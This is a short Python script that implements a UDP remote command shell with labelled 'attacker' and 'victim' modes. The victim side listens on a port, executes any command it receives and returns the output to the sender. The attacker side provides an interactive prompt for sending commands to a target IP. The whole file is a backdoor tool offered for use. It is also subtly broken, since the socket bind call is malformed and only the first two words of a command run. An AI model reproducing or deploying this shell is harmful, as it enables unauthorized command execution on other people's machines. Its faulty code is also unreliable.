from socket import *
from sys import *
from argparse import *
from subprocess import *

def help():
    print("Usage: ./R.py -t <target_host> -p <port>\n")
    print("Examples:")
    print("----------------------")
    print(" Attacker mode ")
    print("./R.py -t 192.168.8.103 -p 9999\n")
    print(" Victim mode ")
    print("./R.py -l -p 9999\n")

def main():
    if(len(argv[1:]) < 2):
        help()

    parser = ArgumentParser(add_help=False)
    parser.add_argument('-t','--target')
    parser.add_argument('-p','--port', type = int)
    parser.add_argument('-l','--listen', action = 'store_true')
    args = parser.parse_args()

    s = socket(AF_INET, SOCK_DGRAM, 0)

    #victim mode
    if(args.listen == True):
        if(args.target):
            print("Victim mode don't use -t")
            exit()

        s.bind("0.0.0.0", args.port)

        while(True):
            msg, addr = s.recvfrom(65000)

            com = msg.decode('ascii')
            data = com[0:].split(' ')

            if (len(data[0:]) > 1):
                res= run([data[0], data[1]], stdout = PIPE)

            else:
                res = run ([com],stdout=PIPE)

            here = res.stdout.decode('utf-8')
            s.sendto(here.encode('utf-8'),addr)

    #attacker mode
    else:
        while(True):
            c = input("Victim Machine $>")
            s.sendto(c.encode('ascii'),(args.target,args.port))

            rmsg,addr = s.recvfrom(65000)

            print(rmsg.decode('utf-8'))

if (__name__ == '__main__'):
    main()

